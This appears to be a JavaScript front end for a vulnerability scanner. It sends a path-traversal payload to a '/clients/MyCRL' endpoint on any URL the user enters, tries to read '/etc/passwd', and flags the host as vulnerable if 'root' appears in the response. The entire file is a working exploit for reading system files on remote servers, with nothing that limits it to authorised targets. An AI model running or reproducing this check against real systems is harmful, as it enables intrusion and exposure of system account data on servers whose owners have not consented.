var sym = ['!','$','%','^','*','(',')','"',"'",'[',']','{','}','<',">",'|']
function containsSymbols(url) {
    for (var i = 0; i < url.length; i++) {
        if (sym.includes(url[i])) {
            return true;
        }
    }
    return false;
}

function checkUrl() {
    let url = document.getElementById('url').value;
    try {
        if (url !== "") {
            if (!isNaN(url) || containsSymbols(url)) {
                document.getElementById('display').innerHTML = "Enter only letters";
            } else {
                fetch(url + '/clients/MyCRL', {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/x-www-form-urlencoded'
                    },
                    body: 'aCSHELL/../../../../../../../etc/passwd'
                })
                .then(response => response.text())
                .then(data => {
                    if (data.includes("root")) {
                        document.getElementById('display').innerHTML = 'It is vulnerable: ' + url;
                    } else {
                        document.getElementById('display').innerHTML = 'It is not vulnerable';
                    }
                })
            }
        } else {
            document.getElementById("display").innerHTML = "Enter URL";
        }
    } catch (err) {
        document.getElementById('display').innerHTML = err;
    }
}